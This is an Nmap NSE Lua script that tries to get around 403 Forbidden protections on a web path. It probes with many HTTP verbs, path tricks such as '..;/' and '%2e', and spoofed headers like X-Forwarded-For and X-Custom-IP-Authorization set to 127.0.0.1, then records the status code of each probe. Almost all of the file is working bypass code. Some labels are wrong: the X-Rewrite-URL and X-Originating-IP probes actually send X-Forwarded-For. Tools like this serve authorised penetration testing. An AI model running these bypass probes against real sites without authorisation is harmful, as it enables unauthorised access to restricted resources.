description = [[
Attempts to bypass 403 Forbidden via different methods.

NSE implementation of byp4ss.sh

Resources
* https://github.com/lobuhi/byp4xx
* https://github.com/iamj0ker/bypass-403

]]

---
-- @usage
-- nmap --script byp4xx.nse <target>
-- nmap --script bypass.nse --script-args="uri=/admin,redirect=false" <target> -p 80
-- nmap --script bypass.nse --script-args="uri=/admin,redirect=true" <target> -p 443
--
-- @output
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http    syn-ack ttl 64
-- | bypass:
-- |   uris:
-- |     URI - Technique - Status Code - Response Size
-- |     404 - 271 - /admin - GET Request
-- |     404 - 271 - /admin - POST Request (Content-Length Zero)
-- |     404 - 0 - /admin - HEAD Request
-- |     200 - 0 - /admin - OPTIONS Request
-- |     405 - 297 - /admin - TRACE Request
-- |     501 - 280 - /admin - TRACK Request
-- |     400 - 330 - /admin - CONNECT Request
-- |     405 - 297 - /admin - PATCH Request
-- |     404 - 271 - /admin - GET Request (%2e)
-- |     404 - 271 - /admin - GET Request (/.)
-- |     404 - 271 - /admin - GET Request (?)
-- |     404 - 271 - /admin - GET Request (??)
-- |     404 - 271 - /admin - GET Request (//)
-- |     404 - 271 - /admin - GET Request (/./)
-- |     404 - 271 - /admin - GET Request (/)
-- |     404 - 271 - /admin - GET Request (/.randomstring)
-- |     404 - 271 - /admin - GET Request (..;/)
-- |     404 - 271 - /admin - GET Request (Referer)
-- |     404 - 271 - /admin - GET Request (X-Forwarded-Host)
-- |     404 - 271 - /admin - GET Request (X-Custom-IP-Authorization)
-- |     404 - 271 - /admin - GET Request (X-Custom-IP-Authorization with (..;/) )
-- |     404 - 271 - /admin - GET Request (X-Original-URL)
-- |     404 - 271 - /admin - GET Request (X-Rewrite-URL)
-- |     404 - 271 - /admin - GET Request (X-Originating-IP)
-- |     404 - 271 - /admin - GET Request (X-Forwarded-For)
-- |     404 - 271 - /admin - GET Request (X-Remote-IP)
-- |     404 - 271 - /admin - GET Request (X-Client-IP)
-- |_    404 - 271 - /admin - GET Request (X-Host)


author = "Dolev Farhi"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"discovery", "fuzzer", "vuln", "intrusive"}

local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"

portrule = shortport.port_or_service( {80, 443}, {"http", "https"}, "tcp", "open")

---
--main
---
action = function(host, port)
  stdnse.debug1("Running byp4xx.nse")
  local base_uri = stdnse.get_script_args("http-4xx-bypass.uri") or '/'
  local redirect = stdnse.get_script_args("http-4xx-bypass.redirect") or true
  local localhost = "127.0.0.1"
  local output = stdnse.output_table()

  output.uris = {}

  if not base_uri then
    base_uri = '/'
  end

  if redirect == "false" then
    redirect = false
  end

  local default_options = {redirect_ok=redirect, no_cache=true, bypass_cache=true, no_cache_body=true}
  local full_url = ("%s://%s%s"):format(port.service, host.targetname or host.ip, base_uri)

  stdnse.debug3(("Attacking %s"):format(full_url))

  output.uris[#output.uris + 1] = ("Response Size - Status Code - URI - Technique")

  -- GET Request
  local technique = "GET Request"
  local response = http.generic_request(host, port, "GET", base_uri, default_options)
  output.uris[#output.uris + 1] = ("%s - %s - %s - %s"):format(response.status, response.header["content-length"] or 0 , base_uri, technique)

  -- POST Request with Content-Length 0
  local technique = "POST Request (Content-Length Zero)"
  local response = http.get(host, port, base_uri , {header = {["Content-Length"] = "0"}} , nil, default_options)
  output.uris[#output.uris + 1] = ("%s - %s - %s - %s"):format(response.status, response.header["content-length"] or 0 , base_uri, technique)

  -- HEAD Request
  local technique = "HEAD Request"
  local response = http.head(host, port, base_uri , nil , nil, default_options)
  output.uris[#output.uris + 1] = ("%s - %s - %s - %s"):format(response.status, response.header["content-length"] or 0 , base_uri, technique)

  -- OPTIONS Request
  local technique = "OPTIONS Request"
  local response = http.generic_request(host, port, "OPTIONS", base_uri, default_options)
  output.uris[#output.uris + 1] = ("%s - %s - %s - %s"):format(response.status, response.header["content-length"] or 0, base_uri, technique)

  -- TRACE Request
  local technique = "TRACE Request"
  local response = http.generic_request(host, port, "TRACE", base_uri, default_options)
  output.uris[#output.uris + 1] = ("%s - %s - %s - %s"):format(response.status, response.header["content-length"] or 0 , base_uri, technique)

  -- TRACK Request
  local technique = "TRACK Request"
  local response = http.generic_request(host, port, "TRACK", base_uri, default_options)
  output.uris[#output.uris + 1] = ("%s - %s - %s - %s"):format(response.status, response.header["content-length"] or 0 , base_uri, technique)

  -- CONNECT Request
  local technique = "CONNECT Request"
  local response = http.generic_request(host, port, "CONNECT", base_uri, default_options)
  output.uris[#output.uris + 1] = ("%s - %s - %s - %s"):format(response.status, response.header["content-length"] or 0 , base_uri, technique)

  -- PATCH Request
  local technique = "PATCH Request"
  local response = http.generic_request(host, port, "PATCH", base_uri, default_options)
  output.uris[#output.uris + 1] = ("%s - %s - %s - %s"):format(response.status, response.header["content-length"] or 0 , base_uri, technique)

  
  -- GET /
  local technique = "GET Request (/)"
  local response = http.get(host, port, '/' .. base_uri, nil, nil, default_options)
  output.uris[#output.uris + 1] = ("%s - %s - %s - %s"):format(response.status, response.header["content-length"] or 0 , base_uri, technique)


  -- GET %2e
  local technique = "GET Request (%2e)"
  local response = http.get(host, port, '/%2e' .. base_uri, nil, nil, default_options)
  output.uris[#output.uris + 1] = ("%s - %s - %s - %s"):format(response.status, response.header["content-length"] or 0 , base_uri, technique)

  -- GET /.
  local technique = "GET Request (/.)"
  local response = http.get(host, port, base_uri .. '/.', nil, nil, default_options)
  output.uris[#output.uris + 1] = ("%s - %s - %s - %s"):format(response.status, response.header["content-length"] or 0 , base_uri, technique)

  -- GET ?
  local technique = "GET Request (?)"
  local response = http.get(host, port, base_uri .. '/?', nil, nil, default_options)
  output.uris[#output.uris + 1] = ("%s - %s - %s - %s"):format(response.status, response.header["content-length"] or 0 , base_uri, technique)

  -- GET ??
  local technique = "GET Request (??)"
  local response = http.get(host, port, base_uri .. '/??', nil, nil, default_options)
  output.uris[#output.uris + 1] = ("%s - %s - %s - %s"):format(response.status, response.header["content-length"] or 0 , base_uri, technique)

  -- GET //
  local technique = "GET Request (//)"
  local response = http.get(host, port, '/' .. base_uri .. '//', nil, nil, default_options)
  output.uris[#output.uris + 1] = ("%s - %s - %s - %s"):format(response.status, response.header["content-length"] or 0 , base_uri, technique)

  -- GET /./
  local technique = "GET Request (/./)"
  local response = http.get(host, port, '/.' .. base_uri .. '/./', nil, nil, default_options)
  output.uris[#output.uris + 1] = ("%s - %s - %s - %s"):format(response.status, response.header["content-length"] or 0 , base_uri, technique)

  -- GET /
  local technique = "GET Request (/)"
  local response = http.get(host, port, base_uri .. '/', nil, nil, default_options)
  output.uris[#output.uris + 1] = ("%s - %s - %s - %s"):format(response.status, response.header["content-length"] or 0 , base_uri, technique)

  -- GET /.randomstring
  local technique = "GET Request (/.randomstring)"
  local response = http.get(host, port, base_uri .. '/.randomstring', nil, nil, default_options)
  output.uris[#output.uris + 1] = ("%s - %s - %s - %s"):format(response.status, response.header["content-length"] or 0 , base_uri, technique)

  -- GET ..;/
  local technique = "GET Request (..;/)"
  local response = http.get(host, port, base_uri .. '..;/', nil, nil, default_options)
  output.uris[#output.uris + 1] = ("%s - %s - %s - %s"):format(response.status, response.header["content-length"] or 0 , base_uri, technique)

  -- GET w Referer
  local technique = "GET Request (Referer)"
  local header = { ["Referer"] = full_url }
  local response = http.generic_request(host, port, "GET", base_uri, {header = header, redirect_ok=redirect})
  output.uris[#output.uris + 1] = ("%s - %s - %s - %s"):format(response.status, response.header["content-length"] or 0 , base_uri, technique)

  -- GET w X-Forwarded-Host
  local technique = "GET Request (X-Forwarded-Host)"
  local header = { ["X-Forwarded-Host"] = localhost }
  local response = http.generic_request(host, port, "GET", base_uri, {header = header, redirect_ok=redirect})
  output.uris[#output.uris + 1] = ("%s - %s - %s - %s"):format(response.status, response.header["content-length"] or 0 , base_uri, technique)


  -- GET w X-Custom-IP-Authorization
  local technique = "GET Request (X-Custom-IP-Authorization)"
  local header = { ["X-Custom-IP-Authorization"] = localhost }
  local response = http.generic_request(host, port, "GET", base_uri, {header = header, redirect_ok=redirect})
  output.uris[#output.uris + 1] = ("%s - %s - %s - %s"):format(response.status, response.header["content-length"] or 0 , base_uri, technique)

  -- GET w X-Custom-IP-Authorization and ..;/
  local technique = "GET Request (X-Custom-IP-Authorization with (..;/) )"
  local header = { ["X-Custom-IP-Authorization"] = localhost }
  local response = http.generic_request(host, port, "GET", base_uri .. '..;/', {header = header, redirect_ok=redirect})
  output.uris[#output.uris + 1] = ("%s - %s - %s - %s"):format(response.status, response.header["content-length"] or 0 , base_uri, technique)

  -- GET w X-Original-URL
  local technique = "GET Request (X-Original-URL)"
  local header = { ["X-Original-URL"] = base_uri }
  local response = http.generic_request(host, port, "GET", base_uri, {header = header, redirect_ok=redirect})
  output.uris[#output.uris + 1] = ("%s - %s - %s - %s"):format(response.status, response.header["content-length"] or 0 , base_uri, technique)

  -- GET w X-Rewrite-URL
  local technique = "GET Request (X-Rewrite-URL)"
  local header = { ["X-Forwarded-For"] = localhost }
  local response = http.generic_request(host, port, "GET", base_uri, {header = header, redirect_ok=redirect})
  output.uris[#output.uris + 1] = ("%s - %s - %s - %s"):format(response.status, response.header["content-length"] or 0 , base_uri, technique)

  -- GET w X-Originating-IP
  local technique = "GET Request (X-Originating-IP)"
  local header = { ["X-Forwarded-For"] = localhost }
  local response = http.generic_request(host, port, "GET", base_uri, {header = header, redirect_ok=redirect})
  output.uris[#output.uris + 1] = ("%s - %s - %s - %s"):format(response.status, response.header["content-length"] or 0 , base_uri, technique)


  -- GET w X-Forwarded-For
  local technique = "GET Request (X-Forwarded-For)"
  local header = { ["X-Forwarded-For"] = localhost }
  local response = http.generic_request(host, port, "GET", base_uri, {header = header, redirect_ok=redirect})
  output.uris[#output.uris + 1] = ("%s - %s - %s - %s"):format(response.status, response.header["content-length"] or 0 , base_uri, technique)

    -- GET w X-Forwarded-For
  local technique = "GET Request (X-Forwarded-For) #2"
  local header = { ["X-Forwarded-For"] = port.service .. '://' .. localhost }
  local response = http.generic_request(host, port, "GET", base_uri, {header = header, redirect_ok=redirect})
  output.uris[#output.uris + 1] = ("%s - %s - %s - %s"):format(response.status, response.header["content-length"] or 0 , base_uri, technique)
  

  -- GET w X-Remote-IP
  local technique = "GET Request (X-Remote-IP)"
  local header = {["X-Remote-IP"] = localhost}
  local response = http.generic_request(host, port, "GET", base_uri, {header = header, redirect_ok=redirect})
  output.uris[#output.uris + 1] = ("%s - %s - %s - %s"):format(response.status, response.header["content-length"] or 0 , base_uri, technique)

  -- GET w X-Client-IP
  local technique = "GET Request (X-Client-IP)"
  local header = { ["X-Client-IP"] = localhost }
  local response = http.generic_request(host, port, "GET", base_uri, {header = header, redirect_ok=redirect})
  output.uris[#output.uris + 1] = ("%s - %s - %s - %s"):format(response.status, response.header["content-length"] or 0 , base_uri, technique)

  -- GET w X-Host
  local technique = "GET Request (X-Host)"
  local header = { ["X-Host"] = localhost }
  local response = http.generic_request(host, port, "GET", base_uri, {header = header, redirect_ok=redirect})
  output.uris[#output.uris + 1] = ("%s - %s - %s - %s"):format(response.status, response.header["content-length"] or 0 , base_uri, technique)
  return output

end